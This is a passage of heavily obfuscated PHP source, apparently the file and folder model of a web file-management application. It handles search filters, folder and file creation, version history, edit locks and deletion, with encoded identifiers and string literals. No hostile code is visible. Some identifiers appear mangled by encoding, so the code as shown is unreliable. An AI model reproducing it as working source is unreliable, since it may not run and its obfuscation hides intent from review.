array_merge($©æßÑõ, array_to_keyvalue($è°çº­û, $êô¢¦ëè[12], $êô¢¦ëè[402])); if (!$“°´ƒ­‘) { return $©æßÑõ; } $Ñ¯¹°Ò» = array($êô¢¦ëè[432] => array($êô¢¦ëè[7], $“°´ƒ­‘)); $è°çº­û = $this->field($êô¢¦ëè[2122])->where($Ñ¯¹°Ò»)->limit($¾ŠÎÇ¿)->select(); $©æßÑõ = array_merge($©æßÑõ, array_to_keyvalue($è°çº­û, $êô¢¦ëè[12], $êô¢¦ëè[402])); $©æßÑõ = array_slice($©æßÑõ, 0, $¾ŠÎÇ¿); return $©æßÑõ; } private function _listSearchBindPinyin($ŒïËˆæ, &$Î´À„×í, &$Ï«ö„«¿) { $ŒÂœ·×ü =& $_SERVER[ì™ı‰º¯]; if (!isset($ŒïËˆæ[$ŒÂœ·×ü[1953]]) || !$ŒïËˆæ[$ŒÂœ·×ü[1953]]) { return; } if (!Input::check($ŒïËˆæ[$ŒÂœ·×ü[1953]], $ŒÂœ·×ü[318]) || strlen($ŒïËˆæ[$ŒÂœ·×ü[1953]]) < 2) { return; } $ñøîŠÅ = "\114\x45\106\124\40\x4a\117\x49\x4e\x20{$this->tablePrefix}\x69\x6f\x5f\x73\157\x75\x72\143\145\x5f\155\145\x74\141\x20\x6d\145\164\x61\40\x6f\156\40\x73\157\x75\x72\143\x65\x2e\163\x6f\x75\162\x63\x65\x49\104\40\75\x20\155\145\164\x61\x2e\x73\x6f\x75\x72\x63\145\x49\104"; $°íãÁ¡œ = array(); $Ï«ö„«¿ = str_replace(array($ŒÂœ·×ü[231], $ŒÂœ·×ü[53], $ŒÂœ·×ü[2123]), $ŒÂœ·×ü[12], $Ï«ö„«¿); $Ï«ö„«¿ = $ŒÂœ·×ü[438] . str_replace($ŒÂœ·×ü[50], $ŒÂœ·×ü[439], $Ï«ö„«¿); $¯µ°ñÌ— = $Î´À„×í[$ŒÂœ·×ü[32]]; unset($Î´À„×í[$ŒÂœ·×ü[32]]); foreach ($Î´À„×í as $ùí—ÍĞ => $ƒí¬Ø–Â) { $°íãÁ¡œ[$ŒÂœ·×ü[438] . $ùí—ÍĞ] = $ƒí¬Ø–Â; } foreach ($¯µ°ñÌ— as $øŒÓ‰ã) { $°íãÁ¡œ[] = array($ŒÂœ·×ü[443] => $øŒÓ‰ã, $ŒÂœ·×ü[999] => $ŒÂœ·×ü[1957], array($ŒÂœ·×ü[2124] => $øŒÓ‰ã, $ŒÂœ·×ü[2125] => array($ŒÂœ·×ü[7], array($ŒÂœ·×ü[465], $ŒÂœ·×ü[464])))); } $this->join($ñøîŠÅ); $Î´À„×í = $°íãÁ¡œ; } private function _parseSearchWhere($¤ÌœĞ) { $ÊÇœˆ÷ª =& $_SERVER[ì™ı‰º¯]; $ˆÑ¢²­ = array(); if (isset($¤ÌœĞ[$ÊÇœˆ÷ª[756]]) && $¤ÌœĞ[$ÊÇœˆ÷ª[756]]) { $ˆÑ¢²­[$ÊÇœˆ÷ª[85]] = array($ÊÇœˆ÷ª[2126], $¤ÌœĞ[$ÊÇœˆ÷ª[756]]); } if (isset($¤ÌœĞ[$ÊÇœˆ÷ª[757]]) && $¤ÌœĞ[$ÊÇœˆ÷ª[757]]) { $ÒªÉôÊ = array($ÊÇœˆ÷ª[2127], $¤ÌœĞ[$ÊÇœˆ÷ª[757]]); if ($ˆÑ¢²­[$ÊÇœˆ÷ª[85]]) { $ˆÑ¢²­[$ÊÇœˆ÷ª[85]] = array($ˆÑ¢²­[$ÊÇœˆ÷ª[85]], $ÒªÉôÊ, $ÊÇœˆ÷ª[2128]); } else { $ˆÑ¢²­[$ÊÇœˆ÷ª[85]] = $ÒªÉôÊ; } } if (isset($¤ÌœĞ[$ÊÇœˆ÷ª[2120]]) && $¤ÌœĞ[$ÊÇœˆ÷ª[2120]] > 0) { $ˆÑ¢²­[$ÊÇœˆ÷ª[76]] = array($ÊÇœˆ÷ª[2126], $¤ÌœĞ[$ÊÇœˆ÷ª[2120]]); } if (isset($¤ÌœĞ[$ÊÇœˆ÷ª[2121]]) && $¤ÌœĞ[$ÊÇœˆ÷ª[2121]]) { $ÒªÉôÊ = array($ÊÇœˆ÷ª[2127], $¤ÌœĞ[$ÊÇœˆ÷ª[2121]]); if ($ˆÑ¢²­[$ÊÇœˆ÷ª[76]]) { $ˆÑ¢²­[$ÊÇœˆ÷ª[76]] = array($ˆÑ¢²­[$ÊÇœˆ÷ª[76]], $ÒªÉôÊ, $ÊÇœˆ÷ª[2128]); } else { $ˆÑ¢²­[$ÊÇœˆ÷ª[76]] = $ÒªÉôÊ; } } if (isset($¤ÌœĞ[$ÊÇœˆ÷ª[590]]) && $¤ÌœĞ[$ÊÇœˆ÷ª[590]]) { $ˆÑ¢²­[] = array($ÊÇœˆ÷ª[456] => $¤ÌœĞ[$ÊÇœˆ÷ª[590]], $ÊÇœˆ÷ª[454] => $¤ÌœĞ[$ÊÇœˆ÷ª[590]], $ÊÇœˆ÷ª[999] => $ÊÇœˆ÷ª[1957]); } if (isset($¤ÌœĞ[$ÊÇœˆ÷ª[412]]) && $¤ÌœĞ[$ÊÇœˆ÷ª[412]]) { $Ó¼Ş¹± = $¤ÌœĞ[$ÊÇœˆ÷ª[412]]; if ($Ó¼Ş¹± == $ÊÇœˆ÷ª[75]) { $ˆÑ¢²­[$ÊÇœˆ÷ª[410]] = 1; } else { if ($Ó¼Ş¹± == $ÊÇœˆ÷ª[2129]) { $ˆÑ¢²­[$ÊÇœˆ÷ª[410]] = 0; } else { if ($Ó¼Ş¹±) { $Ó¼Ş¹± = is_array($Ó¼Ş¹±) ? $Ó¼Ş¹± : explode($ÊÇœˆ÷ª[50], $Ó¼Ş¹±); $ˆÑ¢²­[$ÊÇœˆ÷ª[412]] = array($ÊÇœˆ÷ª[418], $Ó¼Ş¹±); $ˆÑ¢²­[$ÊÇœˆ÷ª[410]] = 0; } } } } $this->_parseSearchParent($¤ÌœĞ, $ˆÑ¢²­); if (isset($¤ÌœĞ[$ÊÇœˆ÷ª[1953]]) && trim($¤ÌœĞ[$ÊÇœˆ÷ª[1953]])) { $Û—¥»‹ = trim($¤ÌœĞ[$ÊÇœˆ÷ª[1953]]); $èÏô­ë = explode($ÊÇœˆ÷ª[53], $Û—¥»‹); if (strlen($Û—¥»‹) > 2 && (substr($Û—¥»‹, 0, 1) == $ÊÇœˆ÷ª[118] && substr($Û—¥»‹, -1) == $ÊÇœˆ÷ª[118]) || substr($Û—¥»‹, 0, 1) == $ÊÇœˆ÷ª[58] && substr($Û—¥»‹, -1) == $ÊÇœˆ÷ª[58]) { $Û—¥»‹ = substr($Û—¥»‹, 1, -1); $èÏô­ë = array($Û—¥»‹); } $ˆÑ¢²­[$ÊÇœˆ÷ª[32]] = array(array($ÊÇœˆ÷ª[540], $ÊÇœˆ÷ª[1955] . $Û—¥»‹ . $ÊÇœˆ÷ª[1955])); if (count($èÏô­ë) > 1) { $ˆÑ¢²­[$ÊÇœˆ÷ª[32]] = array(); foreach ($èÏô­ë as $İ€Í¨ù) { if (!trim($İ€Í¨ù)) { continue; } $ˆÑ¢²­[$ÊÇœˆ÷ª[32]][] = array($ÊÇœˆ÷ª[540], $ÊÇœˆ÷ª[1955] . trim($İ€Í¨ù) . $ÊÇœˆ÷ª[1955]); } } } return $ˆÑ¢²­; } private function _parseSearchParent($áÈ×ı×ğ, &$ëäÊÜ Ê) { $·‡Ş®«Î =& $_SERVER[ì™ı‰º¯]; if (!isset($áÈ×ı×ğ[$·‡Ş®«Î[432]]) || !$áÈ×ı×ğ[$·‡Ş®«Î[432]]) { return; } $ëÙùúèü = $this->pathInfo($áÈ×ı×ğ[$·‡Ş®«Î[432]]); $¦Îè”Õ’ = $ëÙùúèü[$·‡Ş®«Î[432]] . $·‡Ş®«Î[12] === $·‡Ş®«Î[198]; $“ŸÃ­û = $ëÙùúèü[$·‡Ş®«Î[411]] == $·‡Ş®«Î[505]; if ($ëÙùúèü[$·‡Ş®«Î[522]] == $·‡Ş®«Î[523]) { $é±Öôó÷ = $this->sourceInfo($áÈ×ı×ğ[$·‡Ş®«Î[432]]); $ëÙùúèü[$·‡Ş®«Î[511]] = $é±Öôó÷[$·‡Ş®«Î[511]]; } $ëäÊÜ Ê[$·‡Ş®«Î[580]] = array($·‡Ş®«Î[540], $ëÙùúèü[$·‡Ş®«Î[511]] . $áÈ×ı×ğ[$·‡Ş®«Î[432]] . $·‡Ş®«Î[541]); $’Ô¬ÛüŒ = isset($áÈ×ı×ğ[$·‡Ş®«Î[1818]]) && in_array($·‡Ş®«Î[505], $áÈ×ı×ğ[$·‡Ş®«Î[1818]]); if (!$’Ô¬ÛüŒ || !$“ŸÃ­û || !$¦Îè”Õ’ || !$ëÙùúèü[$·‡Ş®«Î[413]]) { return; } if (!AuthModel::authCheckRoot($ëÙùúèü[$·‡Ş®«Î[413]][$·‡Ş®«Î[414]])) { return; } $ÓÚŸãİ = $ëÙùúèü[$·‡Ş®«Î[496]] . $·‡Ş®«Î[12]; if ($ÓÚŸãİ == $·‡Ş®«Î[88]) { unset($ëäÊÜ Ê[$·‡Ş®«Î[580]]); $ëäÊÜ Ê[$·‡Ş®«Î[411]] = self::TYPE_GROUP; return; } $«œõÑ‹â = Model($·‡Ş®«Î[512])->groupChildrenAll($ÓÚŸãİ); $›¼§Ò± = count($«œõÑ‹â); if ($›¼§Ò± <= 1) { return; } $®ñ®Àã— = array($·‡Ş®«Î[432] => 0, $·‡Ş®«Î[411] => self::TYPE_GROUP, $·‡Ş®«Î[496] => array($·‡Ş®«Î[7], $«œõÑ‹â)); $ğø‹ìÄŞ = $this->field($·‡Ş®«Î[2130])->where($®ñ®Àã—)->limit($›¼§Ò±)->select(); $ëäÊÜ Ê[$·‡Ş®«Î[580]] = array(); foreach ($ğø‹ìÄŞ as $ ½ßÈØ“) { $ëäÊÜ Ê[$·‡Ş®«Î[580]][] = array($·‡Ş®«Î[540], $·‡Ş®«Î[521] . $ ½ßÈØ“[$·‡Ş®«Î[402]] . $·‡Ş®«Î[541]); } $ëäÊÜ Ê[$·‡Ş®«Î[580]][] = $·‡Ş®«Î[1957]; } } class SourceModel extends SourceListSearchModel { public $statusIgnoreResetSpace = false; public function userRootAdd($Œ¾Ã»÷‰) { $äÁüÚÉ =& $_SERVER[ì™ı‰º¯]; $†¸¹§¡£ = Model($äÁüÚÉ[504])->where(array($äÁüÚÉ[1661] => $Œ¾Ã»÷‰))->find(); $…¯®ƒ©û = $this->_mkdirRoot(SourceModel::TYPE_USER, $Œ¾Ã»÷‰, $†¸¹§¡£[$äÁüÚÉ[32]]); $this->userDesktopAdd($…¯®ƒ©û); return $…¯®ƒ©û; } public function userDesktopAdd($åğ®–µ) { $¿§¿¶‚÷ =& $_SERVER[ì™ı‰º¯]; $©×·ç® = LNG($¿§¿¶‚÷[2131]); $¢¬ÕˆÅ = $this->mkdir($åğ®–µ, $©×·ç®); $this->metaSet($¢¬ÕˆÅ, $¿§¿¶‚÷[2132], $¿§¿¶‚÷[88]); $this->metaSet($åğ®–µ, $¿§¿¶‚÷[2133], $¢¬ÕˆÅ); } public function userPathSafeAdd($Ä†Ü¡ì‚) { $ƒÔ±¶¬¡ =& $_SERVER[ì™ı‰º¯]; $Ô«Í‚ê = Model($ƒÔ±¶¬¡[504])->getInfoFull($Ä†Ü¡ì‚); if (!$Ô«Í‚ê) { return !1; } if (_get($Ô«Í‚ê, $ƒÔ±¶¬¡[526])) { return $Ô«Í‚ê[$ƒÔ±¶¬¡[466]][$ƒÔ±¶¬¡[2134]]; } $‘‘Ô×–Î = $this->_mkdirRoot(SourceModel::TYPE_USER, $Ä†Ü¡ì‚, $ƒÔ±¶¬¡[2135], $ƒÔ±¶¬¡[433]); Model($ƒÔ±¶¬¡[504])->metaSet($Ä†Ü¡ì‚, $ƒÔ±¶¬¡[2134], $‘‘Ô×–Î); $this->metaSet($‘‘Ô×–Î, $ƒÔ±¶¬¡[2136], $Ä†Ü¡ì‚); return $‘‘Ô×–Î; } public function groupRootAdd($Ë¢ÎÑí™) { $ª™ Êæ‹ =& $_SERVER[ì™ı‰º¯]; $àª˜ÌÊğ = Model($ª™ Êæ‹[512])->where(array($ª™ Êæ‹[1947] => $Ë¢ÎÑí™))->find(); return $this->_mkdirRoot(SourceModel::TYPE_GROUP, $Ë¢ÎÑí™, $àª˜ÌÊğ[$ª™ Êæ‹[32]]); } public function systemRootPathAdd($¢ï…ç¯î) { if ($¢ï…ç¯î != $_SERVER[ì™ı‰º¯][534]) { return !1; } return $this->_mkdirRoot(SourceModel::TYPE_SYSTEM, 0, $¢ï…ç¯î); } public function userRootRemove($ü…„Á£ƒ) { $ú©°üÂŒ = $this->targetSourceRoot(SourceModel::TYPE_USER, $ü…„Á£ƒ, !0); foreach ($ú©°üÂŒ as $‚³¯«¤ê) { if (!$‚³¯«¤ê) { continue; } $this->remove($‚³¯«¤ê[$_SERVER[ì™ı‰º¯][402]], !1); } } public function groupRootRemove($Šõ¢†”ö) { $¢ì•Ë¬± = $this->targetSourceRoot(SourceModel::TYPE_GROUP, $Šõ¢†”ö); if (!$¢ì•Ë¬±) { return; } $this->remove($¢ì•Ë¬±[$_SERVER[ì™ı‰º¯][402]], !1); } private function _mkdirRoot($â¿¦ş, $şƒ±’, $ıªç¿¥, $öŞÏé¼¡ = '') { $Ã½şÚ†¹ =& $_SERVER[ì™ı‰º¯]; $ğ½ùÄÄ‚ = array($Ã½şÚ†¹[401] => 0, $Ã½şÚ†¹[576] => $â¿¦ş, $Ã½şÚ†¹[577] => $şƒ±’, $Ã½şÚ†¹[574] => 1, $Ã½şÚ†¹[578] => USER_ID, $Ã½şÚ†¹[579] => USER_ID, $Ã½şÚ†¹[575] => $öŞÏé¼¡, $Ã½şÚ†¹[580] => $Ã½şÚ†¹[521], $Ã½şÚ†¹[430] => 0, $Ã½şÚ†¹[545] => 0, $Ã½şÚ†¹[469] => 0, $Ã½şÚ†¹[581] => $Ã½şÚ†¹[12]); if ($¤æ×Æì = $this->where($ğ½ùÄÄ‚)->find()) { return $¤æ×Æì[$Ã½şÚ†¹[402]]; } $›ó¬Ÿ§£ = "\115\x6f\144\x65\x6c\123\157\165\x72\143\x65\x2e\x6d\153\x64\151\162\x52\157\157\x74\x2e{$â¿¦ş}\x2e{$şƒ±’}\x2e" . $ıªç¿¥; CacheLock::lock($›ó¬Ÿ§£); $ğ½ùÄÄ‚[$Ã½şÚ†¹[32]] = $ıªç¿¥; $ÜÍİôå° = $this->add($ğ½ùÄÄ‚); $®±Ë‰™– = array($Ã½şÚ†¹[582] => short_id($ÜÍİôå°)); $this->where(array($Ã½şÚ†¹[417] => $ÜÍİôå°))->save($®±Ë‰™–); CacheLock::unlock($›ó¬Ÿ§£); return $ÜÍİôå°; } private function targetSourceRoot($ßúÜİ‡´, $â‰Ã¬², $î ÆñÅ’ = false) { $·Æ¤Ìå¿ =& $_SERVER[ì™ı‰º¯]; $˜ÌÏ… = array($·Æ¤Ìå¿[401] => 0, $·Æ¤Ìå¿[576] => $ßúÜİ‡´, $·Æ¤Ìå¿[577] => $â‰Ã¬²); if ($î ÆñÅ’) { $º˜Ó›ØÇ = $this->where($˜ÌÏ…)->select(); return $º˜Ó›ØÇ ? $º˜Ó›ØÇ : array(); } $úÌ™Æ ÷ = $this->where($˜ÌÏ…)->find(); return $úÌ™Æ ÷ ? $úÌ™Æ ÷ : array(); } public function sourceRootGroup($´ƒ¾ì²Ğ) { $œÎÔ¨êÛ =& $_SERVER[ì™ı‰º¯]; if (is_string($´ƒ¾ì²Ğ)) { $´ƒ¾ì²Ğ = array($´ƒ¾ì²Ğ); } $ËŸãöø = $this->listSourceRoot(SourceModel::TYPE_GROUP, $´ƒ¾ì²Ğ, $œÎÔ¨êÛ[189]); $üÈóâêË = array($œÎÔ¨êÛ[369] => $ËŸãöø, $œÎÔ¨êÛ[366] => array($œÎÔ¨êÛ[754] => count($´ƒ¾ì²Ğ))); $this->_listDataApply($üÈóâêË[$œÎÔ¨êÛ[369]]); $this->_listMake($üÈóâêË); return array_to_keyvalue($üÈóâêË[$œÎÔ¨êÛ[82]], $œÎÔ¨êÛ[496]); } public function mkfile($ŞûŒÂŞ‹, $Í»©Íş‡, $×û‡§ÛÇ = '', $ò¬ˆ±¦¢ = REPEAT_RENAME) { $Åâ¦ñå´ =& $_SERVER[ì™ı‰º¯]; $¦‡ìàÒ³ = Model($Åâ¦ñå´[601])->addFileByContent($×û‡§ÛÇ, $Í»©Íş‡); return $this->_createFileCall($ŞûŒÂŞ‹, $Í»©Íş‡, $¦‡ìàÒ³, $ò¬ˆ±¦¢, $Åâ¦ñå´[1349]); } public function addFile($Æ‘âÉéù, $¯İÈŞ¨å, $‚»Æ§š, $¼½Õ”Ä– = false, $ƒŒ´¢—§ = REPEAT_RENAME) { $£âÔ¤ıä = Model($_SERVER[ì™ı‰º¯][601])->addFile($¯İÈŞ¨å, $‚»Æ§š, $¼½Õ”Ä–); return $this->_createFileCall($Æ‘âÉéù, $‚»Æ§š, $£âÔ¤ıä, $ƒŒ´¢—§); } public function addFileByFileID($àÁÛ¤Íü, $‰ôµ–Ë, $ëØè×€ä, $ÔÛË§ä— = REPEAT_RENAME) { $‡’şÔ¢« =& $_SERVER[ì™ı‰º¯]; $Ä­øĞÓê = Model($‡’şÔ¢«[601])->find($‰ôµ–Ë); Model($‡’şÔ¢«[601])->linkAdd($‰ôµ–Ë); return $this->_createFileCall($àÁÛ¤Íü, $ëØè×€ä, $Ä­øĞÓê, $ÔÛË§ä—); } public function addFileByRemote($Ôîİ, $ñäÕê˜¹, $Ó»©èÑ¿, $øîÌºÆâ = array(), $ç‰¹‘ü = REPEAT_RENAME) { $³ÓØ®û = Model($_SERVER[ì™ı‰º¯][601])->addFileByRemote($ñäÕê˜¹, $Ó»©èÑ¿, $øîÌºÆâ); return $this->_createFileCall($Ôîİ, $Ó»©èÑ¿, $³ÓØ®û, $ç‰¹‘ü); } private function _createFileCall($ÏÂ˜½ßü, $¶áİÙÌ, $šİú¥À°, $ï‚ °‚, $ò†¯ËÑ¬ = "\x75\x70\154\x6f\141\x64") { $Ë¬Â‘ =& $_SERVER[ì™ı‰º¯]; $ìè”±„´ = !1; $this->setMasterDB(); $this->lockWriteStart($ÏÂ˜½ßü, $¶áİÙÌ); $ëÍú¼Ìâ = $this->fileNameExist($ÏÂ˜½ßü, $¶áİÙÌ); $şºˆÜúÃ = $this->_createFile($ÏÂ˜½ßü, $¶áİÙÌ, $šİú¥À°, $ï‚ °‚, $ìè”±„´); if (!$ìè”±„´) { Model($Ë¬Â‘[471])->remove($šİú¥À°[$Ë¬Â‘[468]]); } if ($ìè”±„´ && $şºˆÜúÃ && $şºˆÜúÃ != $ëÍú¼Ìâ) { Model($Ë¬Â‘[2104])->eventCreate($şºˆÜúÃ, $ò†¯ËÑ¬); } $this->lockWriteEnd($ÏÂ˜½ßü, $¶áİÙÌ); return $şºˆÜúÃ; } public function mkdir($»†ô¹ñ, $Ëõ¯ÖÅ, $¨¢ÑŞìÒ = REPEAT_SKIP) { $€ØãÍŒƒ =& $_SERVER[ì™ı‰º¯]; $this->setMasterDB(); $şĞ²Ö«¼ = $this->sourceInfo($»†ô¹ñ); if (!$şĞ²Ö«¼) { return !1; } $this->lockWriteStart($»†ô¹ñ, $Ëõ¯ÖÅ); if ($¨¢ÑŞìÒ !== !1) { $õ¯ßİğ¥ = $this->fileNameExist($»†ô¹ñ, $Ëõ¯ÖÅ); if ($õ¯ßİğ¥ && $¨¢ÑŞìÒ != REPEAT_RENAME_FOLDER) { $this->lockWriteEnd($»†ô¹ñ, $Ëõ¯ÖÅ); return $õ¯ßİğ¥; } $Ëõ¯ÖÅ = $this->fileNameAuto($»†ô¹ñ, $Ëõ¯ÖÅ, $¨¢ÑŞìÒ); } $ÈÇ¾Ûğß = array($€ØãÍŒƒ[574] => 1, $€ØãÍŒƒ[420] => $Ëõ¯ÖÅ, $€ØãÍŒƒ[575] => $€ØãÍŒƒ[12], $€ØãÍŒƒ[469] => 0, $€ØãÍŒƒ[545] => 0); $¢Í‰İáÒ = $this->_addSource($ÈÇ¾Ûğß, $şĞ²Ö«¼); Model($€ØãÍŒƒ[2104])->eventCreate($¢Í‰İáÒ, $€ØãÍŒƒ[1350]); $this->lockWriteEnd($»†ô¹ñ, $Ëõ¯ÖÅ); return $¢Í‰İáÒ; } public function listSourceRoot($Áİ¦ô•û, $õÂ™Øû³, $èÒÁ²Ç = "\x73\157\165\x72\x63\145\111\x44\x2c\x74\141\x72\147\145\164\x49\104\54\163\151\x7a\145") { $Â¢Šèï÷ =& $_SERVER[ì™ı‰º¯]; $è¤ƒÁ´‰ = $Â¢Šèï÷[378]; $ãº ¶À = array(); $±Áì™ÂŒ = 1024 * 50; $èù·ÅĞ» = is_array($èù·ÅĞ») ? $èù·ÅĞ» : array(); $¥·ÍÌáö = count($õÂ™Øû³); $ŸˆØ¹ˆ’ = $this->tablePrefix . $Â¢Šèï÷[2137]; for ($íæÙ› = 0; $íæÙ› < $¥·ÍÌáö; $íæÙ›++) { $ÒÙÙô’ş = $õÂ™Øû³[$íæÙ›]; $è¤ƒÁ´‰ .= "\123\x45\114\105\103\124\40\52\40\106\122\117\115\x20\50\123\105\x4c\105\x43\124\x20{$èÒÁ²Ç}\x20\106\122\117\115\40\140{$ŸˆØ¹ˆ’}\140\40\127\x48\x45\x52\105\x20"; $è¤ƒÁ´‰ .= "\x60\160\x61\x72\145\x6e\164\x49\x44\x60\75\x30\x20\101\x4e\104\40\x60\164\141\162\147\x65\x74\x49\x44\140\x3d{$ÒÙÙô’ş}\40\x41\x4e\104\x20\140\x74\x61\x72\147\145\164\x54\x79\x70\145\x60\75{$Áİ¦ô•û}\40\141\x6e\144\x20\146\x69\154\145\x54\x79\160\145\x3d\x27\47\x20\x6c\x69\155\151\x74\40\x31\x29\40\141\163\x20\164\x62\x5f{$íæÙ›}\40\125\x4e\111\x4f\116\x20\101\x4c\114\x20"; if ((strlen($è¤ƒÁ´‰) >= $±Áì™ÂŒ || $íæÙ› == $¥·ÍÌáö - 1) && $è¤ƒÁ´‰) { $è¤ƒÁ´‰ = substr($è¤ƒÁ´‰, 0, -strlen($Â¢Šèï÷[1037])); $À–ªµ·¾ = $this->query($è¤ƒÁ´‰); $è¤ƒÁ´‰ = $Â¢Šèï÷[12]; $ãº ¶À = array_merge($ãº ¶À, $À–ªµ·¾); } } return $ãº ¶À; } private function _createFile($®ÇÜç², $‡®ÖÎÆ, $¬ÉœÄø¶, $áá«ı· , &$™ºÚêó—) { $¶Àö¶¯´ =& $_SERVER[ì™ı‰º¯]; $°˜©»Æ = $this->sourceInfo($®ÇÜç²); if (!$¬ÉœÄø¶ || !$°˜©»Æ) { return !1; } if ($áá«ı·  !== !1) { $‰½ÏÆ¹ì = $this->fileNameExist($®ÇÜç², $‡®ÖÎÆ); } $™ºÚêó— = !0; if ($áá«ı·  && $‰½ÏÆ¹ì) { if ($áá«ı·  == REPEAT_SKIP) { $™ºÚêó— = !1; return $‰½ÏÆ¹ì; } else { if ($áá«ı·  == REPEAT_REPLACE) { $îÃı®¼É = $this->sourceInfo($‰½ÏÆ¹ì); $óÇÈÒ® = $this->fileHistory($îÃı®¼É, $¬ÉœÄø¶[$¶Àö¶¯´[468]], $¬ÉœÄø¶[$¶Àö¶¯´[76]]); if (!$óÇÈÒ®) { $™ºÚêó— = !1; } else { $this->folderSizeReset($®ÇÜç²); } return $‰½ÏÆ¹ì; } else { $‡®ÖÎÆ = $this->fileNameAuto($®ÇÜç², $‡®ÖÎÆ, $áá«ı· , !1); } } } $¨çô‹¶ò = array($¶Àö¶¯´[574] => 0, $¶Àö¶¯´[420] => $‡®ÖÎÆ, $¶Àö¶¯´[575] => substr(get_path_ext($‡®ÖÎÆ), 0, 10), $¶Àö¶¯´[469] => $¬ÉœÄø¶[$¶Àö¶¯´[468]], $¶Àö¶¯´[545] => $¬ÉœÄø¶[$¶Àö¶¯´[76]]); $øĞ…àÍˆ = $this->_addSource($¨çô‹¶ò, $°˜©»Æ); $this->folderSizeReset($®ÇÜç², intval($¨çô‹¶ò[$¶Àö¶¯´[76]])); return $øĞ…àÍˆ; } protected function fileHistory($ŒÍ«›Â™, $Í°ËÙ¥¹, $ŠÆûòì„) { $üÎéãŠì =& $_SERVER[ì™ı‰º¯]; if ($ŒÍ«›Â™[$üÎéãŠì[468]] == $Í°ËÙ¥¹) { return !1; } $this->checkLock($ŒÍ«›Â™[$üÎéãŠì[402]], $Í°ËÙ¥¹); Model($üÎéãŠì[2138])->addHistory($ŒÍ«›Â™); $ı‡Ø—ñõ = array($üÎéãŠì[579] => USER_ID, $üÎéãŠì[424] => time(), $üÎéãŠì[468] => $Í°ËÙ¥¹, $üÎéãŠì[76] => $ŠÆûòì„); $this->where(array($üÎéãŠì[417] => $ŒÍ«›Â™[$üÎéãŠì[402]]))->save($ı‡Ø—ñõ); $this->sourceCacheClear($ŒÍ«›Â™[$üÎéãŠì[402]]); return !0; } public function checkLock($ã»²™ˆ², $Œöİ¾æ) { $ª¼Æ›äè =& $_SERVER[ì™ı‰º¯]; $Õ¢Ğœ‰ = $this->pathInfo($ã»²™ˆ²); if (!$this->fileIsLock($Õ¢Ğœ‰, !0)) { return; } $±âô»£Í = Session::get($ª¼Æ›äè[2139]); $àÒõõÊá = substr($Õ¢Ğœ‰[$ª¼Æ›äè[32]], 0, -1 - strlen($Õ¢Ğœ‰[$ª¼Æ›äè[174]])) . $ª¼Æ›äè[1207] . $±âô»£Í . $ª¼Æ›äè[10] . $Õ¢Ğœ‰[$ª¼Æ›äè[174]]; $‘­Áû®î = Model($ª¼Æ›äè[601])->find($Œöİ¾æ); $this->_createFileCall($Õ¢Ğœ‰[$ª¼Æ›äè[432]], $àÒõõÊá, $‘­Áû®î, REPEAT_REPLACE, $ª¼Æ›äè[1349]); $¤íş‰Ç­ = $Õ¢Ğœ‰[$ª¼Æ›äè[466]][$ª¼Æ›äè[538]]; $Ñ‰ÒÎ‡¨ = $¤íş‰Ç­[$ª¼Æ›äè[532]] ? $¤íş‰Ç­[$ª¼Æ›äè[532]] : $¤íş‰Ç­[$ª¼Æ›äè[32]]; show_json(LNG($ª¼Æ›äè[2140]) . $ª¼Æ›äè[2141] . LNG($ª¼Æ›äè[2142]) . $ª¼Æ›äè[2143] . $Ñ‰ÒÎ‡¨ . $ª¼Æ›äè[2144], !1); } public function fileIsLock($ª³ÆÅ¡¥, $ñ¼ëóÔ = false) { $›Õ´ã‰ =& $_SERVER[ì™ı‰º¯]; if (!isset($ª³ÆÅ¡¥[$›Õ´ã‰[466]]) || !$ª³ÆÅ¡¥[$›Õ´ã‰[466]][$›Õ´ã‰[535]]) { return !1; } if ($ª³ÆÅ¡¥[$›Õ´ã‰[466]][$›Õ´ã‰[535]] != USER_ID) { return !0; } $É‰ÊŸÀ = $GLOBALS[$›Õ´ã‰[6]][$›Õ´ã‰[89]][$›Õ´ã‰[536]]; if ($ª³ÆÅ¡¥[$›Õ´ã‰[466]][$›Õ´ã‰[537]] <= time() - $É‰ÊŸÀ) { $this->metaSet($ª³ÆÅ¡¥[$›Õ´ã‰[402]], $›Õ´ã‰[535], null); $this->metaSet($ª³ÆÅ¡¥[$›Õ´ã‰[402]], $›Õ´ã‰[537], null); } if ($ñ¼ëóÔ) { $this->metaSet($ª³ÆÅ¡¥[$›Õ´ã‰[402]], $›Õ´ã‰[537], time()); } return !1; } private function _addSource($ûƒ²ò×‰, $úÅÖì¼’) { $¼¡ëÏàö =& $_SERVER[ì™ı‰º¯]; $ÁĞüÕê» = array($¼¡ëÏàö[576] => $úÅÖì¼’[$¼¡ëÏàö[411]], $¼¡ëÏàö[577] => $úÅÖì¼’[$¼¡ëÏàö[496]], $¼¡ëÏàö[578] => USER_ID, $¼¡ëÏàö[579] => USER_ID, $¼¡ëÏàö[401] => $úÅÖì¼’[$¼¡ëÏàö[402]], $¼¡ëÏàö[580] => $úÅÖì¼’[$¼¡ëÏàö[511]] . $úÅÖì¼’[$¼¡ëÏàö[402]] . $¼¡ëÏàö[50], $¼¡ëÏàö[430] => 0, $¼¡ëÏàö[581] => $¼¡ëÏàö[12]); $ûƒ²ò×‰ = array_merge($ÁĞüÕê», $ûƒ²ò×‰); $this->updateModifyTime($ûƒ²ò×‰[$¼¡ëÏàö[432]]); $ØˆœáÍ¬ = $¼¡ëÏàö[2145] . $úÅÖì¼’[$¼¡ëÏàö[402]]; if (isset(self::$cacheChildList[$ØˆœáÍ¬])) { unset(self::$cacheChildList[$ØˆœáÍ¬]); } static $¯ä•æ¦’ = false; if (!$¯ä•æ¦’) { Hook::trigger($¼¡ëÏàö[564], $ûƒ²ò×‰); $¯ä•æ¦’ = !0; } $Ò Íä = $this->add($ûƒ²ò×‰); $ûÚ˜Û”à = array($¼¡ëÏàö[582] => short_id($Ò Íä)); $this->where(array($¼¡ëÏàö[417] => $Ò Íä))->save($ûÚ˜Û”à); $this->setNamePinyin($Ò Íä, $ûƒ²ò×‰[$¼¡ëÏàö[32]]); return $Ò Íä; } public function remove($ËûååË˜, $ã¥ê÷©„ = true) { $Ñ§À‚Ïà =& $_SERVER[ì™ı‰º¯]; $â‚±©  = $this->sourceInfo($ËûååË˜); $ößşˆá‰ = intval($â‚±© [$Ñ§À‚Ïà[411]]) === self::TYPE_SYSTEM; $øÊş×ÇÄ = Model($Ñ§À‚Ïà[435])->get($Ñ§À‚Ïà[2146]) == $Ñ§À‚Ïà[88]; if ($ößşˆá‰ || $ã¥ê÷©„ || !$øÊş×ÇÄ) { return $this->removeNow($ËûååË˜, $ã¥ê÷©„); } $±°¡íÎ = 